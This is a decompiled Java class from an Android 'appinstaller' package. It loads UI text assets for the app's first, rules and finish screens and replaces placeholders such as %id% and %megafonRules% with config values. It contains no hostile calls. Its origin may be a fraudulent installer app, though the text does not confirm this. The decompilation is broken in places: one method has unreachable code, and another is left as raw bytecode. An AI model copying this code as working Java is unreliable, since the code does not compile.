package com.soft.android.appinstaller.core;

import android.content.Context;
import android.content.res.Resources;
import com.soft.android.appinstaller.ActivityTexts;
import com.soft.android.appinstaller.GlobalConfig;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

public class TextFinder
{
  private Context context;
  private ActivityTexts finishTexts = null;
  private ActivityTexts firstActivityTexts = null;
  private List<String> locations;
  private ActivityTexts rulesTexts = null;
  
  public TextFinder(Context paramContext, List<String> paramList)
  {
    this.context = paramContext;
    this.locations = paramList;
  }
  
  private ArrayList<ReplaceItem> getReplaces()
  {
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new ReplaceItem("%id%", GlobalConfig.getInstance().getValue("id")));
    localArrayList.add(new ReplaceItem("%midname%", GlobalConfig.getInstance().getValue("midname")));
    localArrayList.add(new ReplaceItem("%dfrom%", GlobalConfig.getInstance().getValue("dfrom")));
    localArrayList.add(new ReplaceItem("%megafonRules%", GlobalConfig.getInstance().getValue("megafonRules")));
    return localArrayList;
  }
  
  private ActivityTexts getTextForLocation(String paramString)
  {
    Object localObject = new ActivityTexts("Error", "Resource not found", true);
    int i = 0;
    while (i < this.locations.size())
    {
      localObject = "/";
      if ("".equals(this.locations.get(i))) {
        localObject = "";
      }
      localObject = readFile("texts/" + (String)this.locations.get(i) + (String)localObject + paramString, getReplaces());
      if (!((ActivityTexts)localObject).isError()) {
        return localObject;
      }
      i += 1;
    }
    return localObject;
  }
  
  private ActivityTexts readFile(int paramInt, ArrayList<ReplaceItem> paramArrayList)
  {
    Object localObject1 = this.context.getResources().openRawResource(paramInt);
    StringBuilder localStringBuilder = new StringBuilder();
    for (;;)
    {
      try
      {
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader((InputStream)localObject1, "UTF-8"));
        localObject2 = null;
        paramInt = 1;
        localObject1 = localBufferedReader.readLine();
        if (localObject1 != null)
        {
          int i = 0;
          if (i >= paramArrayList.size()) {
            break label175;
          }
          ReplaceItem localReplaceItem = (ReplaceItem)paramArrayList.get(i);
          localObject1 = replace((String)localObject1, localReplaceItem.getFrom(), localReplaceItem.getTo());
          i += 1;
          continue;
          localStringBuilder.append((String)localObject1);
          localStringBuilder.append('\n');
        }
        if (paramInt == 0) {
          continue;
        }
      }
      catch (UnsupportedEncodingException paramArrayList)
      {
        paramArrayList.printStackTrace();
        return new ActivityTexts("Error", "Resource error(UnsupportedEncodingException)", true);
        paramArrayList = new ActivityTexts((String)localObject2, localStringBuilder.toString());
        return paramArrayList;
      }
      catch (IOException paramArrayList)
      {
        paramArrayList.printStackTrace();
        return new ActivityTexts("Error", "Resource error (IOException)", true);
      }
      label175:
      paramInt = 0;
      Object localObject2 = localObject1;
    }
  }
  
  /* Error */
  private ActivityTexts readFile(String paramString, ArrayList<ReplaceItem> paramArrayList)
  {
    // Byte code:
    //   0: ldc -72
    //   2: aload_1
    //   3: invokestatic 190	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   6: pop
    //   7: aload_0
    //   8: getfield 26	com/soft/android/appinstaller/core/TextFinder:context	Landroid/content/Context;
    //   11: invokevirtual 194	android/content/Context:getAssets	()Landroid/content/res/AssetManager;
    //   14: astore 5
    //   16: aload 5
    //   18: aload_1
    //   19: invokevirtual 200	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   22: astore_1
    //   23: new 104	java/lang/StringBuilder
    //   26: dup
    //   27: invokespecial 105	java/lang/StringBuilder:<init>	()V
    //   30: astore 6
    //   32: new 144	java/io/BufferedReader
    //   35: dup
    //   36: new 146	java/io/InputStreamReader
    //   39: dup
    //   40: aload_1
    //   41: ldc -108
    //   43: invokespecial 151	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;Ljava/lang/String;)V
    //   46: invokespecial 154	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   49: astore 7
    //   51: aconst_null
    //   52: astore 5
    //   54: iconst_1
    //   55: istore_3
    //   56: aload 7
    //   58: invokevirtual 157	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   61: astore_1
    //   62: aload_1
    //   63: ifnull +122 -> 185
    //   66: iconst_0
    //   67: istore 4
    //   69: iload 4
    //   71: aload_2
    //   72: invokevirtual 158	java/util/ArrayList:size	()I
    //   75: if_icmpge +62 -> 137
    //   78: aload_2
    //   79: iload 4
    //   81: invokevirtual 159	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   84: checkcast 38	com/soft/android/appinstaller/core/ReplaceItem
    //   87: astore 8
    //   89: aload_1
    //   90: aload 8
    //   92: invokevirtual 162	com/soft/android/appinstaller/core/ReplaceItem:getFrom	()Ljava/lang/String;
    //   95: aload 8
    //   97: invokevirtual 165	com/soft/android/appinstaller/core/ReplaceItem:getTo	()Ljava/lang/String;
    //   100: invokestatic 169	com/soft/android/appinstaller/core/TextFinder:replace	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   103: astore_1
    //   104: iload 4
    //   106: iconst_1
    //   107: iadd
    //   108: istore 4
    //   110: goto -41 -> 69
    //   113: astore_1
    //   114: ldc -54
    //   116: aload_1
    //   117: invokevirtual 205	java/io/IOException:getMessage	()Ljava/lang/String;
    //   120: invokestatic 190	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   123: pop
    //   124: new 76	com/soft/android/appinstaller/ActivityTexts
    //   127: dup
    //   128: ldc 78
    //   130: ldc -49
    //   132: iconst_1
    //   133: invokespecial 83	com/soft/android/appinstaller/ActivityTexts:<init>	(Ljava/lang/String;Ljava/lang/String;Z)V
    //   136: areturn
    //   137: iload_3
    //   138: ifeq +11 -> 149
    //   141: iconst_0
    //   142: istore_3
    //   143: aload_1
    //   144: astore 5
    //   146: goto -90 -> 56
    //   149: aload 6
    //   151: aload_1
    //   152: invokevirtual 111	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   155: pop
    //   156: aload 6
    //   158: bipush 10
    //   160: invokevirtual 172	java/lang/StringBuilder:append	(C)Ljava/lang/StringBuilder;
    //   163: pop
    //   164: goto -108 -> 56
    //   167: astore_1
    //   168: aload_1
    //   169: invokevirtual 175	java/io/UnsupportedEncodingException:printStackTrace	()V
    //   172: new 76	com/soft/android/appinstaller/ActivityTexts
    //   175: dup
    //   176: ldc 78
    //   178: ldc -79
    //   180: iconst_1
    //   181: invokespecial 83	com/soft/android/appinstaller/ActivityTexts:<init>	(Ljava/lang/String;Ljava/lang/String;Z)V
    //   184: areturn
    //   185: new 76	com/soft/android/appinstaller/ActivityTexts
    //   188: dup
    //   189: aload 5
    //   191: aload 6
    //   193: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   196: invokespecial 178	com/soft/android/appinstaller/ActivityTexts:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   199: astore_1
    //   200: aload_1
    //   201: areturn
    //   202: astore_1
    //   203: aload_1
    //   204: invokevirtual 179	java/io/IOException:printStackTrace	()V
    //   207: new 76	com/soft/android/appinstaller/ActivityTexts
    //   210: dup
    //   211: ldc 78
    //   213: ldc -75
    //   215: iconst_1
    //   216: invokespecial 83	com/soft/android/appinstaller/ActivityTexts:<init>	(Ljava/lang/String;Ljava/lang/String;Z)V
    //   219: areturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	220	0	this	TextFinder
    //   0	220	1	paramString	String
    //   0	220	2	paramArrayList	ArrayList<ReplaceItem>
    //   55	88	3	i	int
    //   67	42	4	j	int
    //   14	176	5	localObject	Object
    //   30	162	6	localStringBuilder	StringBuilder
    //   49	8	7	localBufferedReader	BufferedReader
    //   87	9	8	localReplaceItem	ReplaceItem
    // Exception table:
    //   from	to	target	type
    //   16	23	113	java/io/IOException
    //   32	51	167	java/io/UnsupportedEncodingException
    //   56	62	167	java/io/UnsupportedEncodingException
    //   69	104	167	java/io/UnsupportedEncodingException
    //   149	164	167	java/io/UnsupportedEncodingException
    //   185	200	167	java/io/UnsupportedEncodingException
    //   32	51	202	java/io/IOException
    //   56	62	202	java/io/IOException
    //   69	104	202	java/io/IOException
    //   149	164	202	java/io/IOException
    //   185	200	202	java/io/IOException
  }
  
  private static String replace(String paramString1, String paramString2, String paramString3)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    int i = paramString1.indexOf(paramString2);
    int j = 0;
    int k = paramString2.length();
    while (i != -1)
    {
      localStringBuffer.append(paramString1.substring(j, i)).append(paramString3);
      j = i + k;
      i = paramString1.indexOf(paramString2, j);
    }
    localStringBuffer.append(paramString1.substring(j, paramString1.length()));
    return localStringBuffer.toString();
  }
  
  public ActivityTexts getFinishTexts()
  {
    if (this.finishTexts == null) {
      this.finishTexts = getTextForLocation("finish_activity.txt");
    }
    return this.finishTexts;
  }
  
  public ActivityTexts getFirstActivityTexts()
  {
    if (this.firstActivityTexts == null) {
      this.firstActivityTexts = getTextForLocation("first_activity.txt");
    }
    return this.firstActivityTexts;
  }
  
  public ActivityTexts getRulesTexts()
  {
    if (this.rulesTexts == null) {
      this.rulesTexts = getTextForLocation("rules_activity.txt");
    }
    return this.rulesTexts;
  }
}
